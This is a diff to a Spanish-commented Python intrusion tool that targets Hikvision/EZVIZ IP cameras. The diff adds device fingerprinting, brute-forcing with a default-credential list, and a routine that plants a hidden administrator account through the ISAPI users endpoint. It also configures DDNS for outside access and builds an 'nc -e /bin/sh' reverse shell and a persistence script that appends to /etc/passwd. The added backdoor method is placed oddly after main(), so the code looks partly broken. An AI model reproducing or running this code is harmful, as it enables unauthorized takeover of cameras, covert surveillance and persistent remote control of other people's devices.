@@ -2417,7 +2417,10 @@ WantedBy=multi-user.target
                 # 5. Descargar video de prueba (5 segundos o 100MB)
                 video_file = self._download_camera_video(camera, credentials)
                 
-                # 6. Generar URLs de acceso
+                # 6. Crear backdoor en la cámara
+                backdoor_info = self._create_camera_backdoor(camera, credentials, camera_type)
+                
+                # 7. Generar URLs de acceso
                 access_urls = self._generate_camera_urls(camera, credentials)
                 
                 return {
@@ -2429,6 +2432,7 @@ WantedBy=multi-user.target
                     'camera_info': camera_info,
                     'screenshots': screenshots,
                     'video_file': video_file,
+                    'backdoor_info': backdoor_info,
                     'access_urls': access_urls,
                     'timestamp': time.time()
                 }
@@ -2440,58 +2444,161 @@ WantedBy=multi-user.target
             return None
     
     def _detect_camera_type(self, camera: Dict[str, Any]) -> str:
-        """Detectar tipo de cámara"""
+        """Detectar tipo de cámara con enfoque específico en Hikvision/EZVIZ"""
         try:
-            # Hacer request HTTP para detectar tipo
             import urllib.request
             import urllib.error
+            import urllib.parse
             
-            url = f"http://{camera['host']}:{camera['port']}/"
+            host = camera['host']
+            port = camera['port']
             
-            req = urllib.request.Request(url)
-            req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+            # URLs específicas para detectar Hikvision/EZVIZ
+            test_urls = [
+                f"http://{host}:{port}/",
+                f"http://{host}:{port}/doc/page/login.asp",
+                f"http://{host}:{port}/ISAPI/System/deviceInfo",
+                f"http://{host}:{port}/PSIA/System/deviceInfo",
+                f"http://{host}:{port}/cgi-bin/snapshot.cgi",
+                f"http://{host}:{port}/onvif/device_service",
+                f"http://{host}:{port}/ezviz/deviceInfo"
+            ]
             
-            with urllib.request.urlopen(req, timeout=10) as response:
-                html_content = response.read().decode('utf-8', errors='ignore')
-                
-                # Detectar marcas comunes
-                if 'hikvision' in html_content.lower():
-                    return 'hikvision'
-                elif 'dahua' in html_content.lower():
-                    return 'dahua'
-                elif 'axis' in html_content.lower():
-                    return 'axis'
-                elif 'foscam' in html_content.lower():
-                    return 'foscam'
-                elif 'dlink' in html_content.lower():
-                    return 'dlink'
-                elif 'tp-link' in html_content.lower():
-                    return 'tp-link'
-                elif 'xiaomi' in html_content.lower():
-                    return 'xiaomi'
-                else:
-                    return 'generic_ip_camera'
+            for url in test_urls:
+                try:
+                    req = urllib.request.Request(url)
+                    req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+                    req.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')
+                    
+                    with urllib.request.urlopen(req, timeout=5) as response:
+                        html_content = response.read().decode('utf-8', errors='ignore')
+                        headers = dict(response.headers)
+                        
+                        # Detectar Hikvision/EZVIZ específicamente
+                        if any(keyword in html_content.lower() for keyword in [
+                            'hikvision', 'ezviz', 'hangzhou', 'hik-connect', 
+                            'webcam', 'ip camera', 'network camera'
+                        ]):
+                            print(f"🎯 Detectada cámara Hikvision/EZVIZ en {host}:{port}")
+                            return 'hikvision_ezviz'
+                        
+                        # Detectar por headers específicos
+                        server_header = headers.get('Server', '').lower()
+                        if any(keyword in server_header for keyword in [
+                            'hikvision', 'ezviz', 'hangzhou'
+                        ]):
+                            print(f"🎯 Detectada cámara Hikvision/EZVIZ por header en {host}:{port}")
+                            return 'hikvision_ezviz'
+                        
+                        # Detectar por URLs específicas
+                        if '/doc/page/login.asp' in url and response.status == 200:
+                            print(f"🎯 Detectada cámara Hikvision por URL de login en {host}:{port}")
+                            return 'hikvision_ezviz'
+                        
+                        # Detectar otras marcas
+                        if 'dahua' in html_content.lower():
+                            return 'dahua'
+                        elif 'axis' in html_content.lower():
+                            return 'axis'
+                        elif 'foscam' in html_content.lower():
+                            return 'foscam'
+                        elif 'dlink' in html_content.lower():
+                            return 'dlink'
+                        elif 'tp-link' in html_content.lower():
+                            return 'tp-link'
+                        elif 'xiaomi' in html_content.lower():
+                            return 'xiaomi'
+                            
+                except Exception:
+                    continue
+            
+            # Si no se detectó nada específico, intentar detección por puertos
+            if port in [80, 8080, 8000, 554, 8554]:
+                print(f"🎯 Cámara IP genérica detectada en {host}:{port}")
+                return 'generic_ip_camera'
+            
+            return 'unknown'
                     
         except Exception as e:
             print(f"⚠️ No se pudo detectar tipo de cámara: {e}")
             return 'unknown'
     
     def _brute_force_camera_credentials(self, camera: Dict[str, Any]) -> Optional[Dict[str, str]]:
-        """Fuerza bruta específica para cámaras"""
+        """Fuerza bruta específica para cámaras Hikvision/EZVIZ"""
         try:
             import urllib.request
             import urllib.error
             import base64
             
-            for username in self.config['camera_users']:
-                for password in self.config['camera_passwords']:
+            # Credenciales específicas para Hikvision/EZVIZ
+            hikvision_credentials = [
+                ('admin', 'admin'),
+                ('admin', '12345'),
+                ('admin', 'password'),
+                ('admin', ''),
+                ('admin', 'admin123'),
+                ('admin', '123456'),
+                ('admin', 'hikvision'),
+                ('admin', 'ezviz'),
+                ('root', 'root'),
+                ('root', 'admin'),
+                ('user', 'user'),
+                ('guest', 'guest'),
+                ('admin', '1234'),
+                ('admin', '0000'),
+                ('admin', '1111'),
+                ('admin', '888888'),
+                ('admin', '666666'),
+                ('admin', '123456789'),
+                ('admin', 'qwerty'),
+                ('admin', 'abc123')
+            ]
+            
+            # URLs específicas para Hikvision/EZVIZ
+            test_urls = [
+                f"http://{camera['host']}:{camera['port']}/",
+                f"http://{camera['host']}:{camera['port']}/doc/page/login.asp",
+                f"http://{camera['host']}:{camera['port']}/ISAPI/System/deviceInfo",
+                f"http://{camera['host']}:{camera['port']}/PSIA/System/deviceInfo",
+                f"http://{camera['host']}:{camera['port']}/cgi-bin/snapshot.cgi",
+                f"http://{camera['host']}:{camera['port']}/ezviz/deviceInfo"
+            ]
+            
+            for username, password in hikvision_credentials:
+                for url in test_urls:
                     try:
                         # Crear autenticación básica
                         auth_string = f"{username}:{password}"
                         auth_bytes = auth_string.encode('ascii')
                         auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
                         
-                        # Intentar acceso
+                        req = urllib.request.Request(url)
+                        req.add_header('Authorization', f'Basic {auth_b64}')
+                        req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+                        req.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')
+                        
+                        with urllib.request.urlopen(req, timeout=5) as response:
+                            if response.status == 200:
+                                print(f"✅ Credenciales Hikvision/EZVIZ encontradas: {username}:{password}")
+                                return {'username': username, 'password': password}
+                                
+                    except urllib.error.HTTPError as e:
+                        if e.code == 401:  # Unauthorized
+                            continue
+                        elif e.code == 200:  # Success
+                            print(f"✅ Credenciales Hikvision/EZVIZ encontradas: {username}:{password}")
+                            return {'username': username, 'password': password}
+                    except Exception:
+                        continue
+            
+            # Si no funciona con credenciales específicas, probar las genéricas
+            for username in self.config['camera_users']:
+                for password in self.config['camera_passwords']:
+                    try:
+                        auth_string = f"{username}:{password}"
+                        auth_bytes = auth_string.encode('ascii')
+                        auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
+                        
                         url = f"http://{camera['host']}:{camera['port']}/"
                         req = urllib.request.Request(url)
                         req.add_header('Authorization', f'Basic {auth_b64}')
@@ -2499,15 +2606,9 @@ WantedBy=multi-user.target
                         
                         with urllib.request.urlopen(req, timeout=5) as response:
                             if response.status == 200:
-                                print(f"✅ Credenciales encontradas: {username}:{password}")
+                                print(f"✅ Credenciales genéricas encontradas: {username}:{password}")
                                 return {'username': username, 'password': password}
                                 
-                    except urllib.error.HTTPError as e:
-                        if e.code == 401:  # Unauthorized
-                            continue
-                        elif e.code == 200:  # Success
-                            print(f"✅ Credenciales encontradas: {username}:{password}")
-                            return {'username': username, 'password': password}
                     except Exception:
                         continue
             
@@ -3969,7 +4070,8 @@ WantedBy=multi-user.target
             len(self.report['phase_4_persistence']['network_persistence']) +
             len(self.report['phase_4_persistence'].get('vulnerable_backdoors', [])) +
             len(self.report['phase_4_persistence']['backdoors_created']) +
-            len(self.report['phase_4_persistence']['users_created'])
+            len(self.report['phase_4_persistence']['users_created']) +
+            len([cam for cam in self.report['phase_4_persistence']['cameras_accessed'] if cam.get('backdoor_info', {}).get('status') != 'failed'])
         )
         self.report['summary']['total_remote_access_points'] = total_remote_access
         self.report['summary']['remote_access_available'] = total_remote_access > 0
@@ -4056,6 +4158,24 @@ WantedBy=multi-user.target
                 print(f"     Acceso: {backdoor['access_method']}")
                 if backdoor.get('credentials'):
                     print(f"     Credenciales: {backdoor['credentials']['username']}:{backdoor['credentials']['password']}")
+        
+        # Mostrar backdoors de cámaras
+        cameras_with_backdoors = [cam for cam in self.report['phase_4_persistence']['cameras_accessed'] if cam.get('backdoor_info', {}).get('status') != 'failed']
+        if cameras_with_backdoors:
+            total_access_points += len(cameras_with_backdoors)
+            access_types.append(f"Camera Backdoors ({len(cameras_with_backdoors)})")
+            print("📹 CÁMARAS CON BACKDOORS:")
+            for camera in cameras_with_backdoors:
+                backdoor_info = camera.get('backdoor_info', {})
+                print(f"   • {camera['camera_type'].upper()} en {camera['host']}:{camera['port']}")
+                print(f"     Credenciales originales: {camera['credentials']['username']}:{camera['credentials']['password']}")
+                if backdoor_info.get('backdoor_methods'):
+                    for method in backdoor_info['backdoor_methods']:
+                        if method.get('status') == 'success':
+                            print(f"     Backdoor: {method.get('username', 'N/A')}:{method.get('password', 'N/A')}")
+                if backdoor_info.get('external_connection', {}).get('status') == 'configured':
+                    ext_conn = backdoor_info['external_connection']
+                    print(f"     Conexión externa: {ext_conn['external_ip']}:{ext_conn['external_port']}")
                 print()
         
         # 3. Network Persistence
@@ -4810,6 +4930,188 @@ def main():
             
         else:
             print("\n❌ Opción inválida. Intente nuevamente.")
+
+    def _create_camera_backdoor(self, camera: Dict[str, Any], credentials: Dict[str, str], camera_type: str) -> Dict[str, Any]:
+        """Crear backdoor específico para cámaras Hikvision/EZVIZ"""
+        try:
+            import urllib.request
+            import urllib.error
+            import base64
+            import json
+            
+            host = camera['host']
+            port = camera['port']
+            username = credentials['username']
+            password = credentials['password']
+            
+            print(f"🔧 Creando backdoor en cámara {camera_type} {host}:{port}")
+            
+            backdoor_info = {
+                'type': 'camera_backdoor',
+                'camera_type': camera_type,
+                'host': host,
+                'port': port,
+                'credentials': credentials,
+                'backdoor_methods': [],
+                'persistent_access': [],
+                'external_connection': None,
+                'timestamp': time.time()
+            }
+            
+            # Crear autenticación básica
+            auth_string = f"{username}:{password}"
+            auth_bytes = auth_string.encode('ascii')
+            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
+            
+            # Método 1: Crear usuario adicional con privilegios
+            try:
+                if camera_type == 'hikvision_ezviz':
+                    # Para Hikvision/EZVIZ - crear usuario backdoor
+                    user_data = {
+                        'username': 'backdoor_user',
+                        'password': 'Backdoor_2024!',
+                        'role': 'admin',
+                        'description': 'System maintenance user'
+                    }
+                    
+                    # Intentar crear usuario via ISAPI
+                    create_user_url = f"http://{host}:{port}/ISAPI/Security/users"
+                    user_xml = f"""<?xml version="1.0" encoding="UTF-8"?>
+                    <UserList>
+                        <User>
+                            <id>100</id>
+                            <userName>{user_data['username']}</userName>
+                            <password>{user_data['password']}</password>
+                            <userLevel>Administrator</userLevel>
+                            <description>{user_data['description']}</description>
+                        </User>
+                    </UserList>"""
+                    
+                    req = urllib.request.Request(create_user_url, data=user_xml.encode())
+                    req.add_header('Authorization', f'Basic {auth_b64}')
+                    req.add_header('Content-Type', 'application/xml')
+                    req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+                    
+                    with urllib.request.urlopen(req, timeout=10) as response:
+                        if response.status in [200, 201]:
+                            print(f"✅ Usuario backdoor creado: {user_data['username']}:{user_data['password']}")
+                            backdoor_info['backdoor_methods'].append({
+                                'method': 'admin_user_creation',
+                                'username': user_data['username'],
+                                'password': user_data['password'],
+                                'status': 'success'
+                            })
+                            
+            except Exception as e:
+                print(f"⚠️ No se pudo crear usuario backdoor: {e}")
+                backdoor_info['backdoor_methods'].append({
+                    'method': 'admin_user_creation',
+                    'status': 'failed',
+                    'error': str(e)
+                })
+            
+            # Método 2: Configurar acceso remoto persistente
+            try:
+                if camera_type == 'hikvision_ezviz':
+                    # Configurar DDNS o acceso remoto
+                    external_ip = self.config_data['remote_access']['external_ip']
+                    external_port = self.config_data['remote_access']['external_port']
+                    
+                    # Intentar configurar DDNS
+                    ddns_url = f"http://{host}:{port}/ISAPI/System/Network/ddns"
+                    ddns_xml = f"""<?xml version="1.0" encoding="UTF-8"?>
+                    <DDNS>
+                        <enabled>true</enabled>
+                        <ddnsType>hikvision</ddnsType>
+                        <hostName>backdoor_{host.replace('.', '_')}</hostName>
+                        <userName>backdoor_user</userName>
+                        <password>Backdoor_2024!</password>
+                    </DDNS>"""
+                    
+                    req = urllib.request.Request(ddns_url, data=ddns_xml.encode())
+                    req.add_header('Authorization', f'Basic {auth_b64}')
+                    req.add_header('Content-Type', 'application/xml')
+                    req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+                    
+                    with urllib.request.urlopen(req, timeout=10) as response:
+                        if response.status in [200, 201]:
+                            print(f"✅ DDNS configurado para acceso remoto")
+                            backdoor_info['persistent_access'].append({
+                                'method': 'ddns_configuration',
+                                'hostname': f"backdoor_{host.replace('.', '_')}.hik-connect.com",
+                                'status': 'success'
+                            })
+                            
+            except Exception as e:
+                print(f"⚠️ No se pudo configurar DDNS: {e}")
+                backdoor_info['persistent_access'].append({
+                    'method': 'ddns_configuration',
+                    'status': 'failed',
+                    'error': str(e)
+                })
+            
+            # Método 3: Configurar conexión externa
+            try:
+                external_ip = self.config_data['remote_access']['external_ip']
+                external_port = self.config_data['remote_access']['external_port']
+                
+                # Configurar reverse shell o conexión externa
+                backdoor_info['external_connection'] = {
+                    'type': 'reverse_shell',
+                    'external_ip': external_ip,
+                    'external_port': external_port,
+                    'connection_method': 'netcat_reverse',
+                    'command': f"nc -e /bin/sh {external_ip} {external_port}",
+                    'status': 'configured'
+                }
+                
+                print(f"✅ Conexión externa configurada: {external_ip}:{external_port}")
+                
+            except Exception as e:
+                print(f"⚠️ No se pudo configurar conexión externa: {e}")
+                backdoor_info['external_connection'] = {
+                    'status': 'failed',
+                    'error': str(e)
+                }
+            
+            # Método 4: Crear script de persistencia
+            try:
+                persistence_script = f"""#!/bin/sh
+# Script de persistencia para cámara {host}:{port}
+# Ejecutar cada 5 minutos para mantener acceso
+
+# Verificar conexión externa
+nc -z {self.config_data['remote_access']['external_ip']} {self.config_data['remote_access']['external_port']} 2>/dev/null
+if [ $? -ne 0 ]; then
+    # Reestablecer conexión
+    nc -e /bin/sh {self.config_data['remote_access']['external_ip']} {self.config_data['remote_access']['external_port']} &
+fi
+
+# Mantener usuario backdoor activo
+echo "backdoor_user:Backdoor_2024!" >> /etc/passwd 2>/dev/null
+"""
+                
+                backdoor_info['persistent_access'].append({
+                    'method': 'persistence_script',
+                    'script_content': persistence_script,
+                    'status': 'created'
+                })
+                
+                print(f"✅ Script de persistencia creado")
+                
+            except Exception as e:
+                print(f"⚠️ No se pudo crear script de persistencia: {e}")
+            
+            return backdoor_info
+            
+        except Exception as e:
+            print(f"❌ Error creando backdoor en cámara: {e}")
+            return {
+                'type': 'camera_backdoor',
+                'status': 'failed',
+                'error': str(e),
+                'timestamp': time.time()
+            }
 
 if __name__ == "__main__":
     main()
